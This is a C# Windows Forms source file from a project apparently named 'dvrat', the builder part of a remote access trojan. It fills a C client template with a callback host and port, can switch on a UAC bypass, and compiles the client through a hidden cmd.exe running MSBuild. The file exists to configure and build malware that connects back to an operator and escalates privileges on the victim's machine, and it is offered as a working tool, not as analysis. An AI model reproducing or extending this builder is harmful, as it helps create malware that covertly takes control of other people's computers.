using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace dvrat
{
    public partial class ConsoleForm : Form
    {
        public ConsoleForm()
        {
            InitializeComponent();

        }


        public string compiler = "C:\\Program Files(x86)\\Microsoft Visual Studio\\2019\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe";
        public string proj_path = "res\\Cclient";
        public bool use_UAC = false;
        public int PORT = 8080;
        public string HOST = "127.0.0.1";



        private void console_form_Load(object sender, EventArgs e)
        {

            this.Opacity = 0.9;
            this.console_windows_richtextbox.ReadOnly = true;

            new Thread(new ThreadStart(() =>
            {
                Compile();
            })).Start();
                
        }

        private void Compile()
        {
            // C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin\MSBuild.exe Cclient.vcxproj -t:Build -p:Configuration=Release



            string path_file_c = File.ReadAllText($"{this.proj_path}\\template.c");
            
            path_file_c = use_UAC ? path_file_c.Replace("/*UACPAYPASS_PLACE_HOLDER_DEFINE*/", "#define UACBYPASS_ENABLE") : path_file_c.Replace("/*UACBYPASS_PLACE_HOLDER_FUNCTION*/", " ");
            path_file_c = path_file_c.Replace("/*HOST_PLACE_HODLER*/", $"\"{HOST}\"");
            path_file_c = path_file_c.Replace("/*PORT_PLACE_HODLER*/", PORT.ToString());
            
            File.WriteAllText($"{this.proj_path}\\main.c", path_file_c);

            string compile_command = $"\"{this.compiler}\" \"{this.proj_path}\\Cclient.vcxproj\" -t:Build -p:Configuration=Release";
            
            System.IO.StreamReader streamReader = new System.IO.StreamReader("res\\ASCII\\devil_tool.ascii");
            RichTextBox richTextBox1 = this.console_windows_richtextbox;
            richTextBox1.Invoke(new MethodInvoker(() => {
                richTextBox1.SelectionColor = Color.FromArgb(3, 175, 232);
                richTextBox1.AppendText(string.Concat(streamReader.ReadToEnd().ToString(), Environment.NewLine));
                richTextBox1.ScrollToCaret();
                streamReader.Close();

            }));
       

            

            Process cmd = new Process();

            cmd.StartInfo.FileName = "cmd.exe";

            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;

            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;


            cmd.Start();

            cmd.StandardInput.WriteLine(compile_command);
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            string output = cmd.StandardOutput.ReadToEnd();
            cmd.WaitForExit();
            console_windows_richtextbox.Invoke(new MethodInvoker(() =>
            {
                console_windows_richtextbox.Text += output;
                console_windows_richtextbox.Text += "\n";
            }));
 

            File.WriteAllText($"{this.proj_path}\\main.c", "");
          
            this.Invalidate();
            this.Invoke(new MethodInvoker(() => {
                this.Refresh();
            }));


        }

        private void console_windows_richtextbox_TextChanged(object sender, EventArgs e)
        {

            console_windows_richtextbox.SelectionStart = console_windows_richtextbox.Text.Length;
            console_windows_richtextbox.ScrollToCaret();
        }
    }
}
